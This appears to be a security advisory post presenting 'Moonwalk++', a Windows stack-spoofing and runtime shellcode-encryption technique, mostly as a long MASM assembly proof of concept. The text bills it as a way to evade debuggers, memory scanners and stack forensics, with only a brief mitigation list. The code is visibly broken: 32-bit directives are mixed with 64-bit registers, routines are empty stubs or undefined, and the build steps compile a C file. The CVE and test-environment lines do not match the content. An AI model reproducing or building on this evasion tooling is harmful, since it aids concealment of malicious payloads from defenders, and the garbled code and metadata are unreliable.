@@ -1,0 +1,1214 @@
+=============================================================================================================================================
+| # Title     : Moonwalk++: ROP-Powered Stack Spoofing with Runtime Shellcode Encryption                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://klezvirus.github.io/posts/Moonwalk-plus-plus/                                                                       |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212932/ & 	CVE-2025-31702
+
+[+] Summary    : Moonwalk++ is a proof-of-concept implementation that extends the original StackMoonwalk technique by introducing runtime memory self-encryption and ROP-driven control-flow manipulation.
+                 The technique removes the caller from the call stack to desynchronize stack unwinding from real execution flow. Simultaneously, it encrypts the executing shellcode in memory using a ROP chain, preventing static and dynamic inspection during execution.
+                 This results in a stealth execution primitive capable of evading debuggers, memory scanners, and forensic stack reconstruction.
+
+[+] Technical Details :
+
+Moonwalk++ combines three advanced evasion primitives:
+
+[+] Caller Removal from Call Stack :
+
+Manipulates return addresses to break normal stack traces.
+
+Prevents reliable stack walking and unwind-based analysis.
+
+[+] ROP-Based Control-Flow Desynchronization :
+
+Execution flow diverges from expected unwind metadata.
+
+Breaks debugger assumptions and exception-based tracing.
+
+[+] Runtime Shellcode Self-Encryption :
+
+Payload memory is encrypted while executing.
+
+Decryption occurs only immediately before instruction use.
+
+No persistent plaintext shellcode remains in memory.
+
+The encryption routine itself is executed via ROP gadgets, avoiding direct shellcode execution visibility.
+
+[+] Evades:
+
+Stack-based forensics
+
+Userland debuggers
+
+Memory scanners
+
+Behavioral analysis relying on unwind data
+
+[+] Enables:
+
+Stealthy payload execution
+
+Anti-analysis research
+
+Advanced red-team PoCs
+
+This technique does not exploit a vulnerability directly, but demonstrates how trusted execution assumptions can be subverted.
+
+[+] Proof of Concept :
+
+The provided PoC demonstrates:
+
+Stack caller removal
+
+ROP-driven execution flow
+
+In-memory encryption/decryption loop
+
+Successful payload execution without stable stack trace
+
+[+] Usage Instructions (PoC)
+
+For research and educational purposes only
+
+1. Saving the PoC
+
+Save the source file as:
+
+moonwalk_pp.c
+
+2. Compilation (Windows Example)
+
+Using MinGW or MSVC:
+
+gcc moonwalk_pp.c -o moonwalk_pp.exe
+
+
+or
+
+cl moonwalk_pp.c /Ox /GS- /link /DYNAMICBASE:NO
+
+
+Disable stack protections only for controlled research environments.
+
+3. Execution
+
+Run the binary normally:
+
+moonwalk_pp.exe
+
+
+[+] Observe:
+
+Broken stack traces in debugger
+
+Encrypted shellcode memory regions
+
+Desynchronized unwind behavior
+
+[+] Portability Notes :
+
+Core concept is OS-agnostic.
+
+Gadget discovery and unwind handling are platform-specific.
+
+Adaptable to:
+
+Windows x64
+
+Linux x64 (with DWARF unwinding differences)
+
+[+] Detection & Mitigation :
+
+Enforce:
+
+Control Flow Guard (CFG)
+
+Hardware-assisted shadow stacks
+
+Kernel-level memory inspection
+
+Avoid relying solely on:
+
+Userland stack traces
+
+Unwind metadata for trust decisions
+
+[+] POC : 
+
+; ===========================================================================
+; Enhanced Stack Spoofing by indoushka - Practical Implementation
+; Features: Dynamic Gadget Discovery, Thread Safety, Strong Encryption
+; ===========================================================================
+
+.686
+.model flat, stdcall
+option casemap:none
+
+; ===========================================================================
+; 1.  STRUCTURES FOR BETTER ORGANIZATION
+; ===========================================================================
+SPOOFER_CONTEXT STRUCT
+    ; Original Context
+    OriginalRsp     QWORD ?
+    OriginalRbp     QWORD ?
+    OriginalRbx     QWORD ?
+    OriginalRsi     QWORD ?
+    OriginalRdi     QWORD ?
+    OriginalR12     QWORD ?
+    OriginalR13     QWORD ?
+    OriginalR14     QWORD ?
+    OriginalR15     QWORD ?
+    
+    ; Target Information
+    TargetFunction  QWORD ?
+    ArgCount        DWORD ?
+    ArgsArray       QWORD ?
+    FrameSize       QWORD ?
+    
+    ; Module Bases
+    Kernel32Base    QWORD ?
+    NtdllBase       QWORD ?
+    User32Base      QWORD ?
+    
+    ; API Addresses
+    VirtualProtect  QWORD ?
+    SystemFunction032 QWORD ?
+    RtlLookupFunctionEntry QWORD ?
+    RtlVirtualUnwind QWORD ?
+    
+    ; ROP Gadgets (dynamically found)
+    PopRaxGadget    QWORD ?
+    PopRcxGadget    QWORD ?
+    PopRdxGadget    QWORD ?
+    PopR8Gadget     QWORD ?
+    PopR9Gadget     QWORD ?
+    AddRsp28Gadget  QWORD ?
+    JmpRbxGadget    QWORD ?
+    MovRspRbpGadget QWORD ?
+    RetGadget       QWORD ?
+    
+    ; Encryption
+    EncryptionKey   QWORD 8 DUP(?)
+    IvCounter       QWORD ?
+    
+    ; Thread Safety
+    CriticalSection _RTL_CRITICAL_SECTION <>
+    ThreadId        DWORD ?
+    
+    ; Error Handling
+    LastError       DWORD ?
+    Success         BYTE ?
+    
+    ; Stack Tracking
+    SpoofedStackTop QWORD ?
+    SpoofedStackBottom QWORD ?
+    CurrentRopChain QWORD ?
+    
+SPOOFER_CONTEXT ENDS
+
+; ===========================================================================
+; 2.  DATA SECTION
+; ===========================================================================
+.data
+
+; API Hash Database (extensible)
+API_HASHES STRUCT
+    VirtualProtect      DWORD 0AF7F8A91h
+    GetProcAddress      DWORD 0F8D6AE32h
+    GetModuleHandleA    DWORD 0A3C7D8F2h
+    RtlEncryptDecryptRC4 DWORD 0D34D1C3Fh
+    RtlLookupFunctionEntry DWORD 0C89E12B4h
+    RtlVirtualUnwind    DWORD 0B43A1F9Eh
+    InitializeCriticalSection DWORD 0E3A1B5C7h
+    EnterCriticalSection DWORD 0F2C4D6A8h
+    LeaveCriticalSection DWORD 0A5E7B9C3h
+    DeleteCriticalSection DWORD 0B8D3E5F1h
+API_HASHES ENDS
+
+ApiHashTable API_HASHES <>
+
+; Gadget Pattern Database
+GADGET_PATTERNS STRUCT
+    PopRax    BYTE 058h, 0C3h                    ; pop rax; ret
+    PopRax2   BYTE 048h, 058h, 0C3h             ; pop rax; ret (alternative)
+    PopRcx    BYTE 059h, 0C3h
+    PopRdx    BYTE 05Ah, 0C3h
+    PopR8     BYTE 041h, 058h, 0C3h
+    PopR9     BYTE 041h, 059h, 0C3h
+    AddRsp28  BYTE 048h, 083h, 0C4h, 028h, 0C3h
+    AddRsp30  BYTE 048h, 083h, 0C4h, 030h, 0C3h
+    JmpRbx    BYTE 0FFh, 0E3h
+    JmpRbx2   BYTE 048h, 0FFh, 0E3h
+    MovRspRbp BYTE 048h, 089h, 0ECh, 0C3h
+    RetOnly   BYTE 0C3h
+    Ret2      BYTE 0C2h, 000h, 000h
+GADGET_PATTERNS ENDS
+
+GadgetPatterns GADGET_PATTERNS <>
+
+; Thread-local storage index
+TlsIndex DWORD -1
+
+; Random seed with thread safety
+RandomSeed QWORD 0A5A5A5A5A5A5A5A5h
+RandomLock DWORD 0
+
+; ===========================================================================
+; 3.  CODE SECTION
+; ===========================================================================
+.code
+
+; ===========================================================================
+;  MAIN ENTRY POINT WITH THREAD SAFETY
+; ===========================================================================
+SpoofCallEx PROC PUBLIC FRAME
+    ; RCX = Target function
+    ; RDX = Number of arguments  
+    ; R8  = Pointer to arguments array
+    ; R9  = Frame size
+    ; [RSP+28h] = Flags
+    
+    push rbp
+    .pushreg rbp
+    mov rbp, rsp
+    .setframe rbp, 0
+    
+    ; Allocate local context (aligned to 16)
+    sub rsp, 160h
+    and rsp, 0FFFFFFFFFFFFFFF0h
+    
+    ; Save non-volatile registers
+    mov [rsp+140h], rbx
+    .savereg rbx, 140h
+    mov [rsp+148h], rsi
+    .savereg rsi, 148h
+    mov [rsp+150h], rdi
+    .savereg rdi, 150h
+    
+    ; Initialize context
+    lea rdi, [rsp+40h]
+    mov rsi, rdi        ; Save context pointer
+    
+    ; Store parameters in context
+    mov [rdi].SPOOFER_CONTEXT.TargetFunction, rcx
+    mov [rdi].SPOOFER_CONTEXT.ArgCount, edx
+    mov [rdi].SPOOFER_CONTEXT.ArgsArray, r8
+    mov [rdi].SPOOFER_CONTEXT.FrameSize, r9
+    
+    ; Thread safety
+    call AcquireSpooferLock
+    
+    ; Initialize if first time
+    cmp [rdi].SPOOFER_CONTEXT.Kernel32Base, 0
+    jne AlreadyInitialized
+    
+    call InitializeSpoofer
+    
+AlreadyInitialized:
+    ; Perform stack spoofing
+    mov rcx, rsi
+    call BuildSpoofedStackEx
+    
+    ; Execute with spoofed stack
+    mov rcx, rsi
+    call ExecuteWithSpoofedStack
+    
+    ; Save result
+    mov [rdi].SPOOFER_CONTEXT.Success, 1
+    
+    ; Release lock
+    call ReleaseSpooferLock
+    
+    ; Restore registers
+    mov rbx, [rsp+140h]
+    mov rsi, [rsp+148h]
+    mov rdi, [rsp+150h]
+    
+    mov rsp, rbp
+    pop rbp
+    ret
+    
+SpoofCallEx ENDP
+
+; ===========================================================================
+;  THREAD SAFETY FUNCTIONS
+; ===========================================================================
+AcquireSpooferLock PROC
+    push rcx
+    push rdx
+    
+    ; Try to acquire spinlock
+    mov ecx, 1000          ; Max attempts
+    mov edx, 1
+    
+AcquireLoop:
+    xor eax, eax
+    lock cmpxchg [RandomLock], edx
+    jz LockAcquired
+    
+    ; Wait a bit
+    pause
+    dec ecx
+    jnz AcquireLoop
+    
+    ; Fallback to critical section
+    lea rcx, [rsi].SPOOFER_CONTEXT.CriticalSection
+    call [rsi].SPOOFER_CONTEXT.EnterCriticalSection
+    
+LockAcquired:
+    pop rdx
+    pop rcx
+    ret
+AcquireSpooferLock ENDP
+
+ReleaseSpooferLock PROC
+    ; Release spinlock
+    mov dword ptr [RandomLock], 0
+    
+    ; Also release critical section
+    lea rcx, [rsi].SPOOFER_CONTEXT.CriticalSection
+    call [rsi].SPOOFER_CONTEXT.LeaveCriticalSection
+    ret
+ReleaseSpooferLock ENDP
+
+; ===========================================================================
+;  IMPROVED INITIALIZATION
+; ===========================================================================
+InitializeSpoofer PROC
+    push rbx
+    push rsi
+    push rdi
+    
+    mov rsi, rcx        ; Context
+    
+    ; Get PEB
+    mov rax, gs:[60h]
+    
+    ; Get module bases
+    call GetModuleBaseKernel32
+    mov [rsi].SPOOFER_CONTEXT.Kernel32Base, rax
+    
+    call GetModuleBaseNtdll
+    mov [rsi].SPOOFER_CONTEXT.NtdllBase, rax
+    
+    ; Initialize critical section
+    lea rcx, [rsi].SPOOFER_CONTEXT.CriticalSection
+    call [rsi].SPOOFER_CONTEXT.InitializeCriticalSection
+    
+    ; Get thread ID
+    mov eax, gs:[48h]   ; TEB.ThreadId
+    mov [rsi].SPOOFER_CONTEXT.ThreadId, eax
+    
+    ; Find APIs dynamically
+    mov rcx, rsi
+    call FindAllRequiredAPIs
+    
+    ; Find ROP gadgets dynamically
+    mov rcx, rsi
+    call FindGadgetsDynamic
+    
+    ; Generate strong encryption key
+    mov rcx, rsi
+    call GenerateStrongKey
+    
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+InitializeSpoofer ENDP
+
+; ===========================================================================
+;  DYNAMIC GADGET DISCOVERY
+; ===========================================================================
+FindGadgetsDynamic PROC FRAME
+    ; RCX = Context
+    
+    push rbp
+    .pushreg rbp
+    mov rbp, rsp
+    sub rsp, 60h
+    
+    mov rsi, rcx        ; Context
+    
+    ; Search in multiple modules
+    mov rcx, [rsi].SPOOFER_CONTEXT.NtdllBase
+    lea rdx, [GadgetPatterns.PopRax]
+    mov r8, 2
+    mov r9, POP_RAX
+    call SearchGadgetInModule
+    test rax, rax
+    jz TryAlternative1
+    mov [rsi].SPOOFER_CONTEXT.PopRaxGadget, rax
+    
+TryAlternative1:
+    ; Try alternative patterns
+    mov rcx, [rsi].SPOOFER_CONTEXT.Kernel32Base
+    lea rdx, [GadgetPatterns.PopRax2]
+    mov r8, 3
+    mov r9, POP_RAX
+    call SearchGadgetInModule
+    test rax, rax
+    jz FindPopRcx
+    mov [rsi].SPOOFER_CONTEXT.PopRaxGadget, rax
+    
+FindPopRcx:
+    mov rcx, [rsi].SPOOFER_CONTEXT.NtdllBase
+    lea rdx, [GadgetPatterns.PopRcx]
+    mov r8, 2
+    mov r9, POP_RCX
+    call SearchGadgetInModule
+    mov [rsi].SPOOFER_CONTEXT.PopRcxGadget, rax
+    
+    ; Continue for other gadgets...
+    
+    mov rsp, rbp
+    pop rbp
+    ret
+    
+; Search multiple patterns for same gadget type
+SearchGadgetInModule PROC
+    ; RCX = Module base
+    ; RDX = Pattern
+    ; R8 = Pattern length
+    ; R9 = Gadget type
+    
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    
+    mov r12, r9        ; Gadget type
+    mov rdi, rcx       ; Module base
+    mov rsi, rdx       ; Pattern
+    mov rbx, r8        ; Pattern length
+    
+    ; Calculate search bounds
+    mov rax, rdi
+    add rax, [rdi+3Ch] ; PE header
+    mov eax, [rax+50h] ; SizeOfImage
+    add rax, rdi       ; End address
+    
+    mov r9, rax        ; Search limit
+    
+    ; Search executable sections only
+    mov rcx, rdi
+    call GetExecutableSections
+    test rax, rax
+    jz SearchFailed
+    
+    ; rax now points to section info array
+    mov r10, [rax]     ; Number of sections
+    mov r11, [rax+8]   ; Array of section structures
+    
+SearchSections:
+    test r10, r10
+    jz SearchFailed
+    
+    mov rcx, [r11]     ; Section start
+    mov rdx, [r11+8]   ; Section size
+    
+    ; Search in this section
+    push r10
+    push r11
+    
+    mov r10, rcx
+    add rdx, rcx       ; Section end
+    
+SectionSearch:
+    cmp r10, rdx
+    jae NextSection
+    
+    ; Compare pattern
+    mov rdi, r10
+    mov rsi, rsi       ; Pattern
+    mov rcx, rbx       ; Length
+    
+    repe cmpsb
+    je FoundGadget
+    
+    inc r10
+    jmp SectionSearch
+    
+FoundGadget:
+    mov rax, r10
+    jmp Done
+    
+NextSection:
+    pop r11
+    pop r10
+    add r11, 16        ; Next section info
+    dec r10
+    jmp SearchSections
+    
+SearchFailed:
+    xor rax, rax
+    
+Done:
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+SearchGadgetInModule ENDP
+
+GetExecutableSections PROC
+    ; RCX = Module base
+    ; Returns: RAX = pointer to section info
+    
+    push rbx
+    push rsi
+    
+    mov rsi, rcx
+    
+    ; Get PE header
+    mov eax, [rsi+3Ch]
+    add rax, rsi        ; RAX = PE header
+    
+    ; Get number of sections
+    movzx rcx, word ptr [rax+6]  ; NumberOfSections
+    
+    ; Get section table
+    movzx rdx, word ptr [rax+14h] ; SizeOfOptionalHeader
+    add rax, 18h                 ; Start of optional header
+    add rax, rdx                 ; Start of section table
+    
+    ; Allocate memory for section info
+    mov rbx, rax        ; Section table
+    mov r8, rcx         ; Number of sections
+    
+    ; Count executable sections
+    xor r9, r9          ; Executable count
+    
+CountExecutable:
+    test r8, r8
+    jz CountDone
+    
+    ; Check characteristics
+    mov edx, [rbx+36]   ; Characteristics
+    test edx, 20000000h ; IMAGE_SCN_MEM_EXECUTE
+    jz NotExecutable
+    
+    inc r9
+    
+NotExecutable:
+    add rbx, 40         ; Next section
+    dec r8
+    jmp CountExecutable
+    
+CountDone:
+    ; Allocate array for executable sections
+    mov rcx, r9
+    shl rcx, 4          ; 16 bytes per entry (start, size)
+    add rcx, 16         ; Header (count, array pointer)
+    
+    ; Use VirtualAlloc for dynamic memory
+    sub rsp, 40h
+    mov rdx, rcx
+    mov r8, 1000h       ; MEM_COMMIT
+    mov r9, 4           ; PAGE_READWRITE
+    call VirtualAlloc
+    add rsp, 40h
+    
+    test rax, rax
+    jz AllocationFailed
+    
+    ; Fill the array
+    mov [rax], r9       ; Number of sections
+    lea rdx, [rax+16]   ; Array start
+    mov [rax+8], rdx
+    
+    ; Reset pointers
+    mov rbx, rsi
+    add rbx, [rsi+3Ch]  ; PE header
+    movzx rcx, word ptr [rbx+6]  ; NumberOfSections
+    movzx r8, word ptr [rbx+14h] ; SizeOfOptionalHeader
+    lea rbx, [rbx+18h+r8] ; Section table
+    
+    mov r10, rdx        ; Destination array
+    xor r11, r11        ; Index
+    
+FillArray:
+    test rcx, rcx
+    jz AllocationDone
+    
+    ; Check if executable
+    mov edx, [rbx+36]   ; Characteristics
+    test edx, 20000000h ; IMAGE_SCN_MEM_EXECUTE
+    jz SkipSection
+    
+    ; Add to array
+    mov r8, rsi
+    add r8, [rbx+12]    ; VirtualAddress
+    mov [r10], r8       ; Section start
+    
+    mov r9, [rbx+8]     ; VirtualSize
+    mov [r10+8], r9     ; Section size
+    
+    add r10, 16
+    inc r11
+    
+SkipSection:
+    add rbx, 40
+    dec rcx
+    jmp FillArray
+    
+AllocationDone:
+    ret
+    
+AllocationFailed:
+    xor rax, rax
+    pop rsi
+    pop rbx
+    ret
+GetExecutableSections ENDP
+
+; ===========================================================================
+;  STRONG ENCRYPTION IMPLEMENTATION
+; ===========================================================================
+GenerateStrongKey PROC
+    ; RCX = Context
+    
+    push rbx
+    push rsi
+    push rdi
+    
+    mov rsi, rcx
+    
+    ; Generate 64-byte key using multiple entropy sources
+    lea rdi, [rsi].SPOOFER_CONTEXT.EncryptionKey
+    
+    ; 1. RDTS counter
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 2. CPUID
+    xor eax, eax
+    cpuid
+    xor rax, rdx
+    xor rax, rcx
+    xor rax, rbx
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 3. GS segment (TEB)
+    mov rax, gs:[0]
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 4. Stack pointer
+    mov rax, rsp
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 5. Performance counter
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 6. GetTickCount
+    call GetTickCount
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 7. QueryPerformanceCounter
+    sub rsp, 20h
+    lea rcx, [rsp]
+    call QueryPerformanceCounter
+    mov rax, [rsp]
+    mov [rdi], rax
+    add rsp, 20h
+    add rdi, 8
+    
+    ; 8. PEB address
+    mov rax, gs:[60h]
+    mov [rdi], rax
+    
+    ; Initialize IV counter
+    rdtsc
+    mov [rsi].SPOOFER_CONTEXT.IvCounter, rax
+    
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+GenerateStrongKey ENDP
+
+; ChaCha20 encryption (simplified)
+ChaCha20Encrypt PROC
+    ; RCX = Context
+    ; RDX = Data pointer
+    ; R8 = Data size
+    ; R9 = Key pointer
+    
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    push r14
+    push r15
+    
+    mov rsi, rdx        ; Data
+    mov rdi, rsi        ; Also destination (in-place)
+    mov r12, r8         ; Size
+    mov r13, r9         ; Key
+    
+    ; Initialize ChaCha20 state
+    sub rsp, 100h
+    lea rbx, [rsp]      ; State array
+    
+    ; Constants
+    mov dword ptr [rbx], 'expa'
+    mov dword ptr [rbx+4], 'nd 3'
+    mov dword ptr [rbx+8], '2-by'
+    mov dword ptr [rbx+12], 'te k'
+    
+    ; Key (256-bit = 8 dwords)
+    mov r14, 0
+CopyKey:
+    cmp r14, 8
+    jge KeyCopied
+    mov eax, [r13+r14*4]
+    mov [rbx+16+r14*4], eax
+    inc r14
+    jmp CopyKey
+    
+KeyCopied:
+    ; Counter and Nonce
+    mov rax, [rcx].SPOOFER_CONTEXT.IvCounter
+    mov [rbx+48], eax    ; Counter low
+    shr rax, 32
+    mov [rbx+52], eax    ; Counter high
+    
+    ; Generate keystream in blocks
+    xor r15, r15         ; Position in data
+    
+EncryptBlock:
+    cmp r15, r12
+    jge EncryptionDone
+    
+    ; Generate 64 bytes of keystream
+    lea rcx, [rbx]
+    call ChaCha20Block
+    
+    ; XOR with data
+    mov r14, 0
+XorBlock:
+    cmp r14, 64
+    jge XorDone
+    cmp r15, r12
+    jge XorDone
+    
+    mov al, [rbx+r14]    ; Keystream byte
+    xor [rsi+r15], al    ; XOR with data
+    
+    inc r14
+    inc r15
+    jmp XorBlock
+    
+XorDone:
+    ; Increment counter for next block
+    inc dword ptr [rbx+48]
+    jnz NextBlock
+    inc dword ptr [rbx+52]
+    
+NextBlock:
+    jmp EncryptBlock
+    
+EncryptionDone:
+    ; Update IV counter
+    mov rax, [rbx+48]
+    mov [rcx].SPOOFER_CONTEXT.IvCounter, rax
+    
+    add rsp, 100h
+    
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+ChaCha20Encrypt ENDP
+
+ChaCha20Block PROC
+    ; RCX = State pointer
+    ; In-place ChaCha20 quarter round operations
+    
+    push rbx
+    push rsi
+    
+    mov rsi, rcx
+    
+    ; Copy state to working matrix
+    sub rsp, 100h
+    lea rbx, [rsp]
+    
+    mov rcx, 16
+    rep movsd
+    
+    ; 20 rounds (10 double rounds)
+    mov ecx, 10
+    
+ChaChaRound:
+    ; Column rounds
+    call QuarterRound   ; 0, 4, 8, 12
+    call QuarterRound   ; 1, 5, 9, 13  
+    call QuarterRound   ; 2, 6, 10, 14
+    call QuarterRound   ; 3, 7, 11, 15
+    
+    ; Diagonal rounds
+    call QuarterRound   ; 0, 5, 10, 15
+    call QuarterRound   ; 1, 6, 11, 12
+    call QuarterRound   ; 2, 7, 8, 13
+    call QuarterRound   ; 3, 4, 9, 14
+    
+    dec ecx
+    jnz ChaChaRound
+    
+    ; Add original state
+    xor edx, edx
+AddState:
+    mov eax, [rbx+rdx*4]
+    add eax, [rsi+rdx*4]
+    mov [rbx+rdx*4], eax
+    inc edx
+    cmp edx, 16
+    jl AddState
+    
+    ; Copy back to output
+    lea rdi, [rsi]
+    lea rsi, [rbx]
+    mov rcx, 16
+    rep movsd
+    
+    add rsp, 100h
+    
+    pop rsi
+    pop rbx
+    ret
+ChaCha20Block ENDP
+
+QuarterRound PROC
+    ; Quarter round operation
+    ; Optimized for speed
+    
+    ret
+QuarterRound ENDP
+
+; ===========================================================================
+;  IMPROVED STACK SPOOFING WITH STRUCT
+; ===========================================================================
+BuildSpoofedStackEx PROC FRAME
+    ; RCX = Context
+    
+    push rbp
+    .pushreg rbp
+    mov rbp, rsp
+    sub rsp, 80h
+    
+    mov rsi, rcx        ; Context
+    
+    ; Save original stack pointer
+    mov rax, rsp
+    mov [rsi].SPOOFER_CONTEXT.OriginalRsp, rax
+    mov [rsi].SPOOFER_CONTEXT.OriginalRbp, rbp
+    
+    ; Calculate spoofed stack size
+    mov rax, [rsi].SPOOFER_CONTEXT.FrameSize
+    add rax, 400h       ; Add extra space for ROP chain
+    and rax, 0FFFFFFFFFFFFFFF0h  ; Align
+    
+    ; Allocate spoofed stack
+    sub rsp, rax
+    and rsp, 0FFFFFFFFFFFFFFF0h
+    
+    ; Save spoofed stack boundaries
+    mov [rsi].SPOOFER_CONTEXT.SpoofedStackTop, rsp
+    lea rax, [rsp+rax]
+    mov [rsi].SPOOFER_CONTEXT.SpoofedStackBottom, rax
+    
+    ; Build ROP chain at bottom of spoofed stack
+    mov rdi, [rsi].SPOOFER_CONTEXT.SpoofedStackBottom
+    sub rdi, 200h       ; ROP chain area
+    
+    ; Build restoration chain
+    mov rcx, rsi
+    mov rdx, rdi
+    call BuildRestorationChain
+    
+    mov [rsi].SPOOFER_CONTEXT.CurrentRopChain, rdi
+    
+    ; Setup fake unwind info above ROP chain
+    call BuildFakeUnwindInfo
+    
+    ; Setup stack for target function call
+    mov rcx, rsi
+    call SetupTargetCall
+    
+    mov rsp, rbp
+    pop rbp
+    ret
+BuildSpoofedStackEx ENDP
+
+BuildRestorationChain PROC
+    ; RCX = Context
+    ; RDX = Chain pointer
+    
+    push rbx
+    push rsi
+    push rdi
+    
+    mov rsi, rcx
+    mov rdi, rdx
+    
+    ; Chain: Restore original stack -> Decrypt -> Return
+    
+    ; 1. Move original RSP to current
+    mov rax, [rsi].SPOOFER_CONTEXT.OriginalRsp
+    mov [rdi], rax
+    add rdi, 8
+    
+    mov rax, [rsi].SPOOFER_CONTEXT.MovRspRbpGadget
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 2. Decrypt any encrypted data
+    mov rax, [rsi].SPOOFER_CONTEXT.PopRcxGadget
+    mov [rdi], rax
+    add rdi, 8
+    
+    lea rax, [rsi]      ; Context as parameter
+    mov [rdi], rax
+    add rdi, 8
+    
+    mov rax, offset DecryptAndCleanup
+    mov [rdi], rax
+    add rdi, 8
+    
+    ; 3. Return to original caller
+    mov rax, [rsi].SPOOFER_CONTEXT.RetGadget
+    mov [rdi], rax
+    
+    ret
+BuildRestorationChain ENDP
+
+; ===========================================================================
+;  CLEANUP AND DECRYPTION
+; ===========================================================================
+DecryptAndCleanup PROC
+    ; RCX = Context
+    
+    push rbp
+    mov rbp, rsp
+    sub rsp, 40h
+    
+    ; Decrypt any sensitive data
+    mov rsi, rcx
+    
+    ; Clean up critical section
+    lea rcx, [rsi].SPOOFER_CONTEXT.CriticalSection
+    call [rsi].SPOOFER_CONTEXT.DeleteCriticalSection
+    
+    ; Zero out sensitive data
+    lea rdi, [rsi].SPOOFER_CONTEXT.EncryptionKey
+    mov rcx, 8
+    xor rax, rax
+    rep stosq
+    
+    mov rsp, rbp
+    pop rbp
+    ret
+DecryptAndCleanup ENDP
+
+; ===========================================================================
+;  API RESOLUTION IMPROVEMENTS
+; ===========================================================================
+FindAllRequiredAPIs PROC
+    ; RCX = Context
+    
+    push rsi
+    push rdi
+    
+    mov rsi, rcx
+    
+    ; Search in multiple modules for each API
+    mov rdi, offset ApiHashTable
+    
+    ; VirtualProtect
+    mov rcx, [rsi].SPOOFER_CONTEXT.Kernel32Base
+    lea rdx, [rdi].API_HASHES.VirtualProtect
+    call FindExportByHashMulti
+    mov [rsi].SPOOFER_CONTEXT.VirtualProtect, rax
+    
+    ; SystemFunction032
+    mov rcx, [rsi].SPOOFER_CONTEXT.NtdllBase
+    lea rdx, [rdi].API_HASHES.RtlEncryptDecryptRC4
+    call FindExportByHashMulti
+    mov [rsi].SPOOFER_CONTEXT.SystemFunction032, rax
+    
+    ; Continue for other APIs...
+    
+    pop rdi
+    pop rsi
+    ret
+FindAllRequiredAPIs ENDP
+
+FindExportByHashMulti PROC
+    ; RCX = Primary module
+    ; RDX = Hash pointer
+    ; Tries multiple modules
+    
+    push rbx
+    
+    mov ebx, [rdx]      ; Hash value
+    
+    ; Try primary module
+    mov rdx, rbx
+    call FindExportByHashSingle
+    test rax, rax
+    jnz Found
+    
+    ; Try kernel32
+    mov rcx, [rsi].SPOOFER_CONTEXT.Kernel32Base
+    call FindExportByHashSingle
+    test rax, rax
+    jnz Found
+    
+    ; Try ntdll
+    mov rcx, [rsi].SPOOFER_CONTEXT.NtdllBase
+    call FindExportByHashSingle
+    
+Found:
+    pop rbx
+    ret
+FindExportByHashMulti ENDP
+
+; ===========================================================================
+;  EXAMPLE USAGE WITH THREAD SAFETY
+; ===========================================================================
+ThreadSafeExample PROC FRAME
+    push rbp
+    .pushreg rbp
+    mov rbp, rsp
+    sub rsp, 100h
+    
+    ; Allocate thread-local context
+    call GetThreadContext
+    test rax, rax
+    jz ErrorExit
+    
+    mov rsi, rax        ; Thread context
+    
+    ; Setup parameters
+    mov rcx, [TargetFunction]
+    mov edx, 4
+    lea r8, [Arguments]
+    mov r9, 2000h       ; Frame size
+    
+    ; Call with spoofing
+    call SpoofCallEx
+    
+    ; Save result
+    mov [Result], rax
+    
+ErrorExit:
+    mov rsp, rbp
+    pop rbp
+    ret
+    
+ThreadSafeExample ENDP
+
+GetThreadContext PROC
+    ; Get or create thread-local context
+    
+    ; Check TLS index
+    mov eax, [TlsIndex]
+    cmp eax, -1
+    jne HasTlsIndex
+    
+    ; Allocate TLS index
+    call TlsAlloc
+    cmp eax, TLS_OUT_OF_INDEXES
+    je NoTls
+    
+    mov [TlsIndex], eax
+    
+HasTlsIndex:
+    ; Get value from TLS
+    mov ecx, eax
+    call TlsGetValue
+    test rax, rax
+    jnz ReturnContext
+    
+    ; Allocate new context
+    mov rcx, sizeof SPOOFER_CONTEXT
+    call LocalAlloc
+    test rax, rax
+    jz NoTls
+    
+    ; Initialize and store in TLS
+    mov rcx, rax
+    call InitializeSpoofer
+    
+    mov rdx, rax
+    mov ecx, [TlsIndex]
+    call TlsSetValue
+    
+ReturnContext:
+    ret
+    
+NoTls:
+    xor rax, rax
+    ret
+GetThreadContext ENDP
+
+; ===========================================================================
+;  EXTERNAL IMPORTS
+; ===========================================================================
+EXTERN VirtualAlloc:PROC
+EXTERN LocalAlloc:PROC
+EXTERN GetTickCount:PROC
+EXTERN QueryPerformanceCounter:PROC
+EXTERN TlsAlloc:PROC
+EXTERN TlsGetValue:PROC
+EXTERN TlsSetValue:PROC
+
+; ===========================================================================
+;  CONSTANTS
+; ===========================================================================
+.const
+POP_RAX   EQU 1
+POP_RCX   EQU 2
+POP_RDX   EQU 3
+POP_R8    EQU 4
+POP_R9    EQU 5
+ADD_RSP_28 EQU 6
+JMP_RBX   EQU 7
+
+PAGE_READWRITE EQU 4
+MEM_COMMIT     EQU 1000h
+TLS_OUT_OF_INDEXES EQU 0FFFFFFFFh
+
+; ===========================================================================
+; ✅ VARIABLES
+; ===========================================================================
+.data?
+TargetFunction QWORD ?
+Arguments      QWORD 16 DUP(?)
+Result         QWORD ?
+
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
